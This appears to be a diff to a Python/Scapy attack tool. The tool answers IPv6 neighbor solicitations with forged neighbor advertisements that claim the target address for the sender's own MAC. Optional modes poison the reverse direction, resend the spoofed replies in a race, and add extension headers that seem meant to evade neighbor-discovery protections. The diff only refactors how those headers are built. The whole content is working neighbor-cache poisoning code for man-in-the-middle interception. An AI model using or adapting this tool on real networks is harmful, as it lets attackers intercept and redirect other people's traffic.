@@ -3,27 +3,41 @@ import os
 import signal
 import atexit
 import time
+import functools
+import operator
 import random
 import scapy.all as sp
 import scapy.layers.inet6 as inet6
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-i', '--iface')
-parser.add_argument('-R', '--do-reverse', action='store_true')
-parser.add_argument('-L', '--do-loop', action='store_true')
-parser.add_argument('-F', '--do-frag', action='store_true')
 parser.add_argument('-H', '--do-hbh', action='store_true')
+parser.add_argument('-F', '--do-frag', action='store_true')
 parser.add_argument('-D', '--do-dst', action='store_true')
+parser.add_argument('-r', '--do-reverse', action='store_true')
+parser.add_argument('-l', '--do-loop', action='store_true')
 args = parser.parse_args()
 iface = args.iface
+do_hbh = args.do_hbh
+do_frag = args.do_frag
+do_dst = args.do_dst
 do_reverse = args.do_reverse
 do_loop = args.do_loop
-do_frag = args.do_frag
-do_hbh = args.do_hbh
-do_dst = args.do_dst
 
 if iface:
     sp.conf.iface = iface
+
+ipexthdrs = []
+if do_hbh:
+    ipexthdrs.append(inet6.IPv6ExtHdrHopByHop())
+if do_frag:
+    ipexthdrs.append(inet6.IPv6ExtHdrFragment(id=random.getrandbits(32)))
+if do_dst:
+    ipexthdrs.append(inet6.IPv6ExtHdrDestOpt())
+if ipexthdrs:
+    ipexthdrs = functools.reduce(operator.truediv, ipexthdrs)
+else:
+    ipexthdrs = None
 
 childs = []
 
@@ -47,12 +61,8 @@ def prn(pkt):
 
     p = sp.Ether(dst=pkt.src) / \
         inet6.IPv6(src=nspkt.tgt, dst=ippkt.src)
-    if do_hbh:
-        p /= inet6.IPv6ExtHdrHopByHop()
-    if do_frag:
-        p /= inet6.IPv6ExtHdrFragment(id=random.getrandbits(32))
-    if do_dst:
-        p /= inet6.IPv6ExtHdrDestOpt()
+    if ipexthdrs:
+        p /= ipexthdrs
     p /= inet6.ICMPv6ND_NA(R=1, S=1, O=1, tgt=nspkt.tgt) / \
         inet6.ICMPv6NDOptDstLLAddr(lladdr=sp.conf.iface.mac)
     sp.sendp(p, verbose=0)
@@ -61,18 +71,14 @@ def prn(pkt):
     if do_reverse:
         pr = sp.Ether(dst='33:33:00:00:00:01') / \
             inet6.IPv6(src=ippkt.src, dst=nspkt.tgt)
-        if do_hbh:
-            pr /= inet6.IPv6ExtHdrHopByHop()
-        if do_frag:
-            pr /= inet6.IPv6ExtHdrFragment(id=random.getrandbits(32))
-        if do_dst:
-            pr /= inet6.IPv6ExtHdrDestOpt()
+        if ipexthdrs:
+            pr /= ipexthdrs
         pr /= inet6.ICMPv6ND_NA(R=1, S=0, O=1, tgt=ippkt.src) / \
             inet6.ICMPv6NDOptDstLLAddr(lladdr=sp.conf.iface.mac)
         sp.sendp(pr, verbose=0)
 
-    pid = os.fork()
-    if pid == 0:
+    child = os.fork()
+    if child == 0:
         time.sleep(0.0002)
         sp.sendp(p, verbose=0)
         if do_reverse:
@@ -85,7 +91,7 @@ def prn(pkt):
                     sp.sendp(pr, verbose=0)
     else:
         if do_loop:
-            childs.append(pid)
+            childs.append(child)
 
 
 filterstr = 'icmp6[icmp6type]==icmp6-neighborsolicit and not src ::'
